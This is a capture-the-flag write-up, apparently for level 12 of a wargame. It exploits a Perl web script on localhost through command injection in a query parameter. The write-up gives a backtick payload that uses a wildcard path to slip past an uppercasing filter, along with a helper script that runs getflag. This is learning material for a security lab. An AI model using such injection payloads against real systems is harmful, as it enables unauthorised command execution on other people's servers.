# Level 12

## Check what is available at level launch
```bash
ls -la
# see a Perl script

./level12.pl
cat level12.pl
```
If you execute the file and see its contents, you will see it's a Perl script.  
Kind of similar to level 04, we can use curl to make a request and we can define the content of the `x` variable.

```perl
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
The double quotes in the code allow command substitution to go through.  
The code applies 2 protections to the input before using it :
- turns everything into uppercase
- removes everything after the 1st space  

## Resolving
```bash
touch /tmp/FLAG
# create executable in /tmp/

chmod 777 /tmp/FLAG
# don't forget to give yourself rights to edit

vim /tmp/FLAG
```
We are going to create a script that will run the command to retrieve the token for us.

```bash
#!/bin/sh
getflag > /tmp/output
```
We are going to tell the script to run `getflag` command and send the result to a file.

```bash
curl 'localhost:4646/?x=`/*/FLAG`'

cat /tmp/output
```
We are forced to use `*` because `/tmp/` would be turned into uppercase and that path doesn't exist.  
The script returns `..` to tell us our call went through successfully. We then just need to display the content to get the token for this level.
